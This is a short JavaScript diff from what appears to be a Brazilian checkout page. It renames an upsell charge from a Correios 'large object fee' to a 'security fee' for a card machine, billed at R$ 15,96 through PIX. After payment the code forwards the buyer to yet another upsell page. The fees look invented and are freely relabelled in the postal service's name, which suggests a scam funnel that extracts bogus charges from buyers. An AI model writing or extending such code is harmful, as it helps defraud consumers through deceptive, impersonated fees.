@@ -2452,7 +2452,7 @@ function initUpsellCorreios() {
     const priceLabels = Array.from(
         document.querySelectorAll('[data-upsell-correios-price], #upsell-correios-price')
     );
-    const acceptIdleLabel = btnAccept?.textContent || 'Pagar taxa de objeto grande R$ 15,96';
+    const acceptIdleLabel = btnAccept?.textContent || 'Pagar taxa de seguranca R$ 15,96';
     let submitInFlight = false;
 
     if (leadName && personal?.name) {
@@ -2512,9 +2512,9 @@ function initUpsellCorreios() {
         submitInFlight = true;
 
         const correiosShipping = {
-            id: 'taxa_objeto_grande_correios',
-            name: 'Taxa de objeto grande dos Correios',
-            eta: 'Despacho com validacao de tamanho',
+            id: 'taxa_seguranca_correios',
+            name: 'Taxa de Seguranca da MAQUININHA',
+            eta: 'Despacho Seguro Correios',
             price: offerPrice
         };
 
@@ -2528,13 +2528,13 @@ function initUpsellCorreios() {
         });
 
         try {
-            btnAccept.textContent = 'Gerando PIX da taxa dos Correios...';
+            btnAccept.textContent = 'Gerando PIX da taxa de seguranca...';
             await createPixCharge(correiosShipping, 0, {
                 sourceStage: 'upsell_correios',
                 upsell: {
                     enabled: true,
-                    kind: 'taxa_objeto_grande_correios',
-                    title: 'Taxa de objeto grande dos Correios',
+                    kind: 'taxa_seguranca_correios',
+                    title: 'Taxa de Seguranca Correios',
                     price: offerPrice,
                     previousTxid: String(pix?.idTransaction || '').trim(),
                     targetAfterPaid: 'upsell.html'
